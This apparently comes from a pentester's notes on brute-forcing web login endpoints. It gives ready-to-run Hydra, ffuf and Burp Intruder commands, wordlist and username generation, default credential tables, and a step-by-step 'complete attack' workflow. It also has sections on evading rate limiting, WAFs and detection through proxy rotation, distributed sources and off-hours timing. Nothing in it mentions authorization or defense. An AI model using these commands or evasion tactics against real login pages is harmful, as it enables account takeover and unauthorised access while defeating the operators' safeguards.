#webapplications

Brute forcing web login endpoints to discover valid credentials. Most web applications have weak password policies or reuse common credentials — this technique systematically tests them.

## Identify the login mechanism

### HTML form-based login
```html
<form method="POST" action="/login">
  <input name="username" type="text">
  <input name="password" type="password">
  <button type="submit">Login</button>
</form>
```

**Target:** POST to `/login` with `username=X&password=Y`

### API token/bearer authentication
```
POST /api/auth
Content-Type: application/json

{"username": "admin", "password": "password123"}
```

**Target:** JSON POST with credentials, look for token/JWT in response

### HTTP Basic Authentication
```
curl -u username:password http://target.com/admin
```

**Target:** Authorization header with Base64-encoded credentials

---

## Tool 1: Hydra (Fast, form-based)

**For HTML form logins:**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials"
```

**Flags:**
- `-l admin` — username (single)
- `-L users.txt` — usernames (list)
- `-p password` — password (single)
- `-P rockyou.txt` — passwords (wordlist)
- `-C creds.txt` — username:password pairs
- `/login` — target path
- `username=^USER^&password=^PASS^` — form parameters
- `F=Invalid credentials` — failure string (response contains this on failed login)
- `S=302` — success code (redirect on success)

**For multiple hosts:**
```bash
hydra -l admin -P rockyou.txt -M targets.txt http-post-form "/login:..."
```

**Against rate limiting (slower):**
```bash
hydra -l admin -P rockyou.txt -t 1 -w 5 target.com http-post-form "..."
# -t 1 = 1 thread, -w 5 = 5 second wait
```

---

## Tool 2: ffuf (Flexible, any protocol)

**For form-based login:**
```bash
ffuf -w users.txt:USER -w passwords.txt:PASS \
  -u "http://target.com/login" \
  -X POST \
  -d "username=USER&password=PASS" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fc 200 -fw 50
```

**Flags:**
- `-w users.txt:USER -w passwords.txt:PASS` — multiple wordlists
- `-X POST` — HTTP method
- `-d "..."` — POST data with fuzzing markers
- `-fc 200` — filter by HTTP code (hide 200s)
- `-fw 50` — filter by word count (hide responses with 50 words)
- `-ms 100` — match size (show responses ≥100 bytes)

**For JSON API:**
```bash
ffuf -w users.txt:USER -w passwords.txt:PASS \
  -u "http://target.com/api/auth" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"USER","password":"PASS"}' \
  -fr "error|invalid|unauthorized"
```

---

## Tool 3: Burp Intruder (Interactive, GUI-based)

**Workflow:**
1. Capture a login request in Burp Proxy
2. Send to Intruder
3. Select attack type: **Cluster bomb** (test all username × password combinations)
4. Set payload positions:
   - `username=§admin§&password=§password123§`
5. Load wordlists as payloads
6. Sort results by response length, HTTP code, or response time
7. Look for outliers (different response = valid credentials)

**Manual in Repeater (small wordlist):**
```
1. Capture login request
2. Copy to Repeater
3. Manually change username/password
4. Send and check response
5. Repeat until valid credentials found
```

---

## Wordlist selection

### Default wordlists
```bash
/usr/share/wordlists/rockyou.txt          # Top passwords
/usr/share/wordlists/dirb/common.txt      # Common words
/usr/share/wordlists/metasploit/unix_users.txt  # Common usernames
```

### Custom wordlist generation
```bash
# Top passwords for your target industry
cewl target.com -d 3 -m 6 -w custom.txt

# Combine multiple lists
cat rockyou.txt dirb.txt | sort -u > combined.txt

# Generate based on pattern (year, suffix variations)
hashcat -r /usr/share/hashcat/rules/best64.rule rockyou.txt > mutated.txt
```

### Username generation
```bash
# From employees/contacts found during recon
echo "john.doe" > users.txt
echo "jdoe" >> users.txt
echo "john_doe" >> users.txt

# Common patterns
echo "admin" >> users.txt
echo "root" >> users.txt
echo "test" >> users.txt
echo "guest" >> users.txt
```

---

## Success detection

### HTML form logins
- **Different response size** — successful login redirects or shows different page
- **Redirect (3xx)** — POST succeeds, redirects to dashboard
- **Specific string** — response contains "Welcome" or "Dashboard"
- **Cookie set** — successful login sets session cookie
- **Response time** — longer response = valid user (takes longer to process)

### API logins
- **200 + token** — response includes JWT or bearer token
- **200 + user data** — response includes user profile
- **Specific JSON field** — `"success": true` or `"token": "..."`

### Failure indicators
- **Invalid credentials message** — "username or password incorrect"
- **Account locked** — "account locked after 5 attempts" (stop testing this account)
- **Rate limiting** — 429 Too Many Requests (slow down or switch IPs)

---

## Rate limiting & WAF bypass

### Detect rate limiting
```bash
# Send multiple requests quickly
for i in {1..100}; do
  curl -d "username=admin&password=pass$i" http://target.com/login
done

# Watch for 429, 403, or dramatically slower responses
```

### Bypass techniques

| Technique | Implementation |
| --- | --- |
| **Slow down** | Add delays between requests: `hydra -w 10` or Intruder's "delay" option |
| **IP rotation** | Use proxy list: `hydra -p rockyou.txt -x 10.0.0.1:8080 ...` |
| **Session rotation** | Use new session/cookie per request |
| **Different endpoints** | If `/login` rate-limited, try `/api/login`, `/auth`, etc. |
| **Case variation** | username=Admin vs username=ADMIN (may bypass string matching) |
| **Encoding** | Base64 or URL-encode credentials |
| **Distributed** | Run from multiple machines/IPs simultaneously |
| **Timeframe** | Brute force at night/off-hours when monitoring is lower |

---

## Workflow: Complete attack

### Step 1: Enumerate usernames
```bash
# Use username enumeration if possible
hydra -L users.txt -p dummypass target.com http-post-form "/login:..." -e s
# -e s = try empty password (checks if username exists via different error)
```

### Step 2: Use refined wordlist
```bash
# If you know the company, use industry-specific passwords
# If you know employee names, mutate them
# Start with top 1000 passwords, expand if needed
```

### Step 3: Brute force with chosen tool
```bash
# Using Hydra
hydra -L users.txt -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"

# Watch output for successful logins
[80][http-post-form] host: target.com   login: admin   password: Password123!
```

### Step 4: Verify credentials
```bash
# Test the found credentials manually
curl -c cookies.txt -d "username=admin&password=Password123!" http://target.com/login

# Check if you can access authenticated pages
curl -b cookies.txt http://target.com/dashboard
```

---

## Common default credentials

| Application | Default username | Default password |
| --- | --- | --- |
| Apache Tomcat | tomcat | tomcat |
| Oracle Database | system | oracle |
| MySQL | root | (blank) |
| WordPress | admin | (varies) |
| Cisco ASA | admin | admin |
| Linux SSH | root | (varies) |
| Windows RDP | Administrator | (varies) |

Check these first before wordlist attacks.

---

## Detection & WAF evasion

### What gets flagged
- 100+ requests per second from one IP
- Same username, different passwords (account enumeration)
- Requests from known scanning IPs (shodan, censys)
- Requests with common wordlist strings in password field

### Evasion
- Use distributed IPs (VPN, proxy chains)
- Randomize User-Agent headers
- Add legitimate traffic between attack requests
- Target off-peak hours
- Use real wordlists, not "password123" patterns that scream brute force

---

## Tools needed

- **Hydra** — fast, form-based brute forcing
- **ffuf** — flexible fuzzing, any protocol
- **Burp Suite** — interactive testing, Intruder module
- **curl/wget** — manual verification
- **Wordlists** — rockyou.txt, custom lists
- **Proxy list** — for IP rotation (optional)

---

**See also:**
- [[Broken Access Control]] — IDOR, privilege tampering
- [[Session & Cookie Security]] — session fixation, hijacking
- [[Wordlists]] — dictionary sources and generation
- [[HTTP Requests]] — request anatomy for manual testing
